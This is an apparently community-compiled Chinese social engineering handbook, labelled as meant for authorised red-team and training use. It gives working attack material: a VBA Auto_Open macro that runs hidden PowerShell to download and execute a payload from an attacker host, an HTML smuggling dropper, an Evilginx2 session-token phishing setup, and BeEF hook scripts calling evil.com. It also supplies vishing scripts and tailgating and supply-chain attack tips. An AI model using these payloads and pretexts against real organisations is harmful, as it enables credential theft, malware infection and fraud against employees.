# 社会工程学技术手册

> @TGSEC社区 · @TGSEC-Qtzuu 整理
> 仅用于授权红队演练/安全意识培训

## 一、OSINT信息收集

### 1. 搜索引擎
```bash
# Google Dork
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "password" filetype:xlsx
"target.com" "@target.com" site:linkedin.com
intitle:"index of" site:target.com

# GitHub泄露
site:github.com "target.com" password
site:github.com "target.com" secret_key
site:github.com "target.com" api_key
# 工具: truffleHog, gitleaks, gitrob
trufflehog github --org=targetorg
gitleaks detect -s /path/to/repo
```

### 2. 社交媒体
```bash
# LinkedIn员工枚举
# 工具: linkedin2username
python3 linkedin2username.py -u email -p pass -c "Target Company"

# 邮箱格式推测
# firstname.lastname@target.com
# f.lastname@target.com
# 工具: hunter.io / phonebook.cz / email-format.com

# 邮箱验证
# 工具: verify-email, emailhippo
```

### 3. 域名/IP信息
```bash
# 子域名
subfinder -d target.com -o subs.txt
amass enum -d target.com
# WHOIS
whois target.com
# DNS
dig target.com any
```

### 4. 泄露数据库查询
```bash
# haveibeenpwned.com — 检查邮箱是否泄露
# dehashed.com — 搜索泄露凭据
# intelx.io — 情报搜索
# breachdirectory.org
```

## 二、钓鱼基础设施

### 1. 域名准备
```bash
# 相似域名(typosquatting)
# target.com → tarqet.com / target-inc.com / target.org
# 工具: dnstwist
dnstwist -r target.com

# 域名购买后配置
# SPF记录
v=spf1 include:_spf.google.com ~all
# DKIM
# DMARC
_dmarc.evil.com TXT "v=DMARC1; p=none"
```

### 2. GoPhish钓鱼平台
```bash
# 安装
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip && chmod +x gophish
./gophish  # 默认 https://localhost:3333 admin:gophish

# 流程: 创建模板 → 创建Landing Page → 创建Campaign → 发送
```

### 3. Evilginx2(中间人钓鱼)
```bash
# 安装
go install github.com/kgretzky/evilginx2@latest

# 配置phishlet
config domain evil.com
config ip ATTACKER_IP
phishlets hostname microsoft365 login.evil.com
phishlets enable microsoft365
lures create microsoft365
lures get-url 0
# 生成的URL发给目标 → 实时截获session token
```

## 三、钓鱼邮件技术

### Office宏钓鱼
```vba
' Auto_Open宏 — 打开文档自动执行
Sub Auto_Open()
    Shell "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"
End Sub

' 模板注入(不需要宏启用)
' 远程模板URL: http://ATTACKER/template.dotm
```

### HTML走私(HTML Smuggling)
```html
<!-- 绕过邮件网关,在浏览器端组装恶意文件 -->
<html><body>
<script>
var bin = atob('TVqQAAMA...');  // base64编码的exe
var blob = new Blob([Uint8Array.from(bin, c => c.charCodeAt(0))]);
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'update.exe';
a.click();
</script>
</body></html>
```

### 二维码钓鱼(Quishing)
```bash
# 生成指向钓鱼页面的二维码
python3 -c "
import qrcode
qr = qrcode.make('https://login.evil-target.com/auth')
qr.save('qr_phish.png')
"
# 嵌入邮件/文档/海报
```

## 四、电话社工

### 常见话术框架
```
1. IT支持场景:
   "您好,我是XX公司IT部门的,我们检测到您的账号有异常登录,
    需要您配合验证一下身份信息..."

2. HR场景:
   "您好,这里是人事部,关于您的年终奖/社保/公积金有个问题需要确认,
    请您登录XX系统核实..."

3. 供应商场景:
   "您好,我是XX供应商的,关于上个月的发票/付款有个问题..."
```

## 五、水坑攻击

```bash
# 1. 识别目标常访问的网站
# 分析目标公司员工的社交媒体/论坛/技术博客

# 2. 入侵目标网站植入恶意代码
# 或创建同类型钓鱼网站

# 3. 植入恶意JS
<script src="https://evil.com/hook.js"></script>
# BeEF框架
<script src="http://ATTACKER:3000/hook.js"></script>
```

## 六、物理渗透

```
1. 尾随进入(Tailgating)
   - 穿着类似员工的服装
   - 手持大件物品(纸箱)请求开门
   - 快递/外卖人员伪装

2. 伪装身份
   - IT维修人员(带工具箱)
   - 审计/检查人员(带文件夹)
   - 新员工(第一天上班)

3. USB投毒(Rubber Ducky)
   - 将恶意USB放在停车场/前台/卫生间
   - HID攻击(Rubber Ducky/Bash Bunny)
   - 伪装成充电线(O.MG Cable)
```

## 七、供应链攻击

```bash
# 1. 依赖混淆(Dependency Confusion)
# 在公共npm/pypi注册与内部包同名的恶意包
pip install internal-package-name  # 如果版本号更高会优先安装公共版

# 2. typosquatting
# 注册常见包名的拼写错误版本
# requests → requsets, urllib3 → urllib4

# 3. 入侵CI/CD
# 修改GitHub Actions/Jenkins Pipeline注入恶意代码
```
